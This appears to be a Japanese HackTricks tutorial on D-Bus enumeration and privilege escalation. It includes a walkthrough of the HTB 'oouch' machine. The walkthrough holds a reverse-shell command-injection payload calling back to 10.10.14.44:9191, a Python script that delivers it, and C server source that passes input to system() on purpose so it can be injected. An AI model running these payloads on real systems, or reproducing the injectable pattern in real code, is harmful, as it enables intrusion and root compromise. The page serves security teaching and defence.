# D-Busの列挙とコマンドインジェクションによる権限昇格

{{#include ../../banners/hacktricks-training.md}}

## **GUIによる列挙**

D-Busは、Ubuntuのデスクトップ環境においてプロセス間通信（IPC）の仲介役として利用されています。Ubuntuでは、複数のメッセージバスが同時に動作しています。主に**特権サービスがシステム全体に関係するサービスを公開する**システムバスと、ログインしている各ユーザーについて、そのユーザーだけに関係するサービスを公開するセッションバスです。ここでは、権限昇格を目的としているため、より高い権限（rootなど）で動作するサービスと関連するシステムバスを主に扱います。D-Busのアーキテクチャでは、各セッションバスに「ルーター」が配置されます。ルーターは、クライアントが通信を希望するサービスのアドレスに基づき、クライアントのメッセージを適切なサービスに転送します。<sup>[[1]](#references)</sup>

D-Bus上のサービスは、公開する**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、一般的なOOP言語におけるクラスのインスタンスに相当し、各インスタンスは固有の**オブジェクトパス**で識別されます。このパスはファイルシステムのパスに似ており、サービスが公開する各オブジェクトを一意に識別します。調査において重要なインターフェースの1つが**org.freedesktop.DBus.Introspectable**です。このインターフェースにはIntrospectという単一のメソッドがあり、オブジェクトがサポートするメソッド、シグナル、プロパティをXML形式で返します。ここでは、プロパティとシグナルを省略し、メソッドに焦点を当てます。

D-Busインターフェースとの通信には、2つのツールを使用しました。1つは、スクリプトからD-Busが公開するメソッドを簡単に呼び出すためのCLIツール**gdbus**です。もう1つは[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)で、各バスで利用可能なサービスを列挙し、各サービスに含まれるオブジェクトを表示するために設計されたPythonベースのGUIツールです。

```bash
sudo apt-get install d-feet
```

**session bus**を確認する場合は、まず現在のアドレスを確認してください:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

最初の画像は、D-Bus system bus に登録されたサービスを示しています。System Bus ボタンを選択すると、**org.debin.apt** が強調表示されます。D-Feet はこのサービスにオブジェクトを問い合わせ、2枚目の画像のように、選択したオブジェクトのインターフェース、メソッド、プロパティ、シグナルを表示します。各メソッドのシグネチャも詳しく表示されます。

注目すべき機能として、サービスの **プロセス ID（pid）** と **コマンドライン** が表示されます。これは、そのサービスが昇格した権限で実行されているかどうかを確認するのに役立ち、調査対象として重要です。

**D-Feet ではメソッドの呼び出しも可能です**。ユーザーがパラメーターとして Python 式を入力すると、D-Feet がそれを D-Bus 型に変換してサービスに渡します。

ただし、**メソッドによっては、呼び出す前に認証が必要です**。そもそも認証情報なしで権限昇格することが目的なので、これらのメソッドは無視します。

また、一部のサービスは、特定の操作をユーザーに許可するかどうかを、org.freedeskto.PolicyKit1 という別の D-Bus サービスに問い合わせます。

## **コマンドラインによる列挙**

### サービスオブジェクトの一覧表示

次のコマンドで、開いている D-Bus インターフェースを一覧表示できます。

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

**`(activatable)`** とマークされたサービスは、特に注目すべきです。**まだ実行されていません**が、バスへのリクエストによってオンデマンドで起動できます。`busctl list` だけで済ませず、それらの名前を実際に実行されるバイナリに対応付けてください。

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

これは、activatable name に対してどの `Exec=` path が起動され、どの identity で実行されるかをすぐに把握するのに役立ちます。バイナリまたはその実行チェーンの保護が不十分な場合、非アクティブなサービスでも privilege escalation の経路になり得ます。

特権を持つ USB イメージ作成サービスでは、その system-bus name と、イメージ書き込みアクションに対する**実効**ポリシーを照合してください。古いベンダールールによって、管理者 Unix group にパスワード入力なしで `ResultActive=yes` が付与されている場合があります。現在のアカウントがその group に属していること、セッションがアクティブであること、そのルールが実際に読み込まれていて上書きされていないこと、インストール済みの helper が引き続き呼び出し元指定の source および destination path を受け入れることを確認してください。サービス記述子や古いパッケージバージョンだけでは、任意のファイルにアクセスできることの証明にはなりません。activation descriptor が存在しなくても、サービスがすでに実行中の可能性はあります。イメージ書き込みメソッドを呼び出さずに、固定のポリシーファイルとサービスファイルを調べてください。詳しくは[元のサービス分析](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)を参照してください。

#### 接続

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) プロセスが bus への接続を確立すると、bus はその接続に、_unique connection name_ と呼ばれる特別な bus name を割り当てます。この種の bus name は不変です。接続が存在する限り変更されないことが保証されており、さらに重要なことに、bus の存続期間中に再利用されることはありません。つまり、同じプロセスが bus への接続を閉じて新たに接続を作成した場合でも、その bus 上の他の接続に同じ unique connection name が割り当てられることはありません。unique connection name は、通常は禁止されているコロン文字で始まるため、簡単に識別できます。<sup>[[4]](#references)</sup>

### サービスオブジェクト情報

次に、以下のコマンドでインターフェースに関する情報を取得できます。

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

また、バス名を対応する `systemd` unit および実行ファイルのパスと照合します:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

これは、privesc の際に重要となる運用上の疑問に答えます。**メソッド呼び出しが成功した場合、実際にどのバイナリと unit が処理を実行するのか？**

### Service Object のインターフェースを一覧表示する

十分な権限が必要です。

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### サービスオブジェクトのIntrospect Interface

この例では、`tree`パラメーターを使って見つかった最新のinterfaceが選択されている点に注意してください（_前のセクションを参照_）：

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

インターフェース `htb.oouch.Block` のメソッド `.Block` に注目してください（今回注目しているメソッドです）。他の列にある「s」は、文字列を想定していることを示している可能性があります。

危険な操作を試す前に、まず **読み取り指向** またはその他の低リスクなメソッドで検証してください。これにより、「構文が誤っている」「到達可能だが拒否される」「到達可能で許可される」の3つのケースを明確に切り分けられます。

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### D-Bus Methods と Policies / Actions の関連付け

Introspection では呼び出せる**対象**は分かりますが、その呼び出しが許可または拒否される**理由**までは分かりません。実際の privesc のトリアージでは、通常、次の**3つのレイヤー**をまとめて調べる必要があります。

1. **Activation metadata**（`.service` files または `SystemdService=`）から、実際に実行される binary と unit を把握する。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`）から、誰が `own`、`send_destination`、または `receive_sender` を実行できるかを把握する。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`）から、デフォルトの authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）を把握する。

便利なコマンド：

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** 1:1 の対応関係があると想定しないでください。D-Bus method と Polkit action の対応は、変更対象のオブジェクトや実行時のコンテキストによって異なる場合があります。そのため、実用的な手順は次のとおりです。

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` を実行し、該当する `.policy` ファイルを grep する
3. `busctl call`、`gdbus call`、または `dbusmap --enable-probes --null-agent` を使った、リスクの低い実環境でのプローブ

Proxy や互換サービスには、特に注意が必要です。別の D-Bus サービスへのリクエストを、事前に確立した独自の接続経由で転送する **rootで実行されるproxy** は、元の呼び出し元のIDが再検証されない場合、backend にすべてのリクエストが UID 0 から来たものと誤認させてしまうことがあります。<sup>[[3]](#references)</sup>

### Monitor/Capture インターフェース

十分な権限があれば（`send_destination` と `receive_sender` の権限だけでは不十分です）、**D-Bus通信をmonitor** できます。

**通信をmonitor** するには、**rootである必要があります。** rootで実行しても問題が見つかる場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

> [!WARNING]
> D-Busの設定ファイルを使って**非rootユーザーに通信を盗聴させる**方法をご存じでしたら、**ご連絡ください**！

monitorする方法はいくつかあります。

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

次の例では、インターフェース `htb.oouch.Block` が監視され、誤通信によってメッセージ "**_**lalalalal**_**" が送信されます:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Wiresharkで開ける**pcapng**ファイルに結果を保存するには、`monitor`の代わりに`capture`を使用できます。

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### ノイズをすべてフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上の情報が多すぎる場合は、次のようにマッチルールを指定します：

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

複数のルールを指定できます。メッセージがいずれかのルールに一致すると、そのメッセージが出力されます。例えば次のようになります。

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

match rule の構文について詳しくは、[D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) を参照してください。<sup>[[7]](#references)</sup>

### More

`busctl` にはさらに多くのオプションがあります。[**こちらですべて確認できます**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **Vulnerable Scenario**

HTB のホスト「oouch」内で user **qtc** として、予期しない D-Bus config file が _/etc/dbus-1/system.d/htb.oouch.Block.conf_ にあることを確認できます。

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

前の設定から、D-BUS 通信で情報を送受信するには、ユーザー `root` または `www-data` である必要があることがわかります。

docker container **aeb4525789d8** 内でユーザー **qtc** として、ファイル _/code/oouch/routes.py_ にある dbus 関連のコードを確認できます。該当するコードは次のとおりです：

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

ご覧のとおり、**D-Bus interface に接続**し、"Block" function に "client_ip" を送信しています。

D-Bus connection の反対側では、C でコンパイルされた binary が実行されています。このコードは D-Bus connection で **IP address を待ち受け**、`system` function を使って iptables を呼び出し、指定された IP address をブロックします。\
**`system` の呼び出しには意図的に command injection の脆弱性がある**ため、次のような payload で reverse shell を作成できます: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

このページの最後に、**D-Bus application の C code 全体**があります。その中の 91〜97 行を見ると、**`D-Bus object path` と `interface name` の登録方法**がわかります。この情報は、D-Bus connection に情報を送信するために必要です:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

また、57行目を見ると、この D-Bus 通信に**登録されている唯一のメソッド**は `Block` です(_**そのため、次のセクションではペイロードをサービスオブジェクト `htb.oouch.Block`、インターフェース `/htb/oouch/Block`、メソッド名 `Block` に送信します**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

以下の Python コードは、`block_iface.Block(runme)` を介して D-Bus 接続に payload を `Block` メソッドへ送信します（_前のコードチャンクから抽出したものです_）：

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` は「Message Bus」にメッセージを送信するためのツールです。
- Message Bus – アプリケーション間の通信を容易にするためにシステムで使用されるソフトウェアです。Message Queue（メッセージが順番に並ぶ）に関連していますが、Message Bus ではサブスクリプションモデルでメッセージを送信し、処理も非常に高速です。
- 「-system」タグは、デフォルトのセッションメッセージではなく、システムメッセージであることを指定します。
- 「–print-reply」タグは、メッセージを適切に出力し、返信があれば人間が読みやすい形式で受け取るために使用します。
- 「–dest=Dbus-Interface-Block」は、Dbus インターフェースのアドレスです。
- 「–string:」は、インターフェースに送信するメッセージの型です。double、bytes、booleans、int、objpath など、メッセージを送信する形式はいくつかあります。このうち「object path」は、ファイルのパスを Dbus インターフェースに送信するときに便利です。この場合、特殊ファイル（FIFO）を使って、ファイル名としてコマンドをインターフェースに渡せます。「string:;」は、FIFO の reverse shell ファイル／コマンドを配置した object path を再度呼び出すためのものです。

_`htb.oouch.Block.Block` の最初の部分（`htb.oouch.Block`）は service object を参照し、最後の部分（`.Block`）はメソッド名を参照することに注意してください。_

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## 自動 Enumeration ヘルパー（2023-2025）

大規模な D-Bus attack surface を `busctl`/`gdbus` で手動で Enumeration するのは、すぐに手間がかかるようになります。ここ数年で公開された小規模な FOSS ユーティリティを 2 つ使えば、red-team や CTF の活動中に作業を効率化できます。

### dbusmap（「D-Bus 用の Nmap」）
* 作者: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C で書かれた、単一の静的バイナリ（50 kB 未満）。すべてのオブジェクトパスを調べ、`Introspect` XML を取得し、所有する PID/UID に対応付けます。<sup>[[5]](#references)</sup>
* 便利なフラグ:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* このツールは保護されていない well-known names に `!` を付け、*own*（乗っ取り）できるサービスや、非特権シェルから呼び出せるメソッドをすぐに特定できます。

### uptux.py
* 著者: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd units 内の*書き込み可能な*パスと、過度に許可の緩い D-Bus policy files（例: `send_destination="*"`）を探す、Python のみで動作するスクリプトです。<sup>[[6]](#references)</sup>
* 簡単な使い方:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* D-Bus module は以下のディレクトリを検索し、一般ユーザーが spoof または hijack できるサービスを強調表示します。
  * `/etc/dbus-1/system.d/` および `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/`（vendor overrides）

---

## 注目すべき D-Bus Privilege-Escalation Bugs（2024-2025）

最近公開された CVE を把握しておくと、カスタムコードにある同様の安全でないパターンを見つけやすくなります。最近の良い例を2つ紹介します。<sup>[[2]](#references)[[3]](#references)</sup>

| 年 | CVE | コンポーネント | 根本原因 | 攻撃面での教訓 |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root で動作するサービスが、権限のないユーザーから再設定可能な D-Bus インターフェースを公開しており、攻撃者が制御するマクロ動作の読み込みも可能でした。 | system bus 上で **device/profile/config management** を公開するデーモンでは、書き込み可能な設定やマクロ機能を単なる「設定」ではなく、コード実行プリミティブとして扱いましょう。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root で動作する互換性プロキシが、元の呼び出し元のセキュリティコンテキストを保持せずにバックエンドサービスへリクエストを転送していたため、バックエンドはプロキシを UID 0 として信頼していました。 | **proxy / bridge / compatibility** D-Bus サービスは別個のバグクラスとして扱いましょう。特権付きの呼び出しを中継する場合、呼び出し元の UID/Polkit コンテキストがバックエンドにどう伝わるかを確認してください。 |

注目すべきパターン:
1. サービスが **system bus 上で root として動作**している。
2. **認可チェックがない**か、チェックが**誤った主体**に対して行われている。
3. 到達可能なメソッドが最終的にシステムの状態を変更する。たとえば、パッケージのインストール、ユーザーやグループの変更、bootloader の設定、デバイスプロファイルの更新、ファイルへの書き込み、またはコマンドの直接実行などです。

`dbusmap --enable-probes` または手動の `busctl call` を使ってメソッドに到達できるか確認し、サービスの policy XML と Polkit actions を調べて、**どの主体**が実際に認可されているかを把握しましょう。

---

## Hardening & Detection の簡易対策

* world-writable または *send/receive* が許可されたポリシーを検索します:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* 危険なメソッドには Polkit を必須にする – *root* の proxy であっても、`polkit_authority_check_authorization_sync()` には自身の PID ではなく、*caller* の PID を渡す。
* 長時間実行される helper では権限を落とす（bus に接続した後、`sd_pid_get_owner_uid()` を使って namespace を切り替える）。
* service を削除できない場合は、少なくとも専用の Unix group に*範囲を限定*し、XML policy でアクセスを制限する。
* Blue team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` で system bus をキャプチャし、Wireshark にインポートして異常を検出する。

---

## References

- [1] [Ubuntu Desktop における USBCreator D-Bus の権限昇格](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service が権限のない任意のユーザーによる設定を許可](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service における認証バイパス (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - 「D-Bus 用 Nmap」](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus ドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
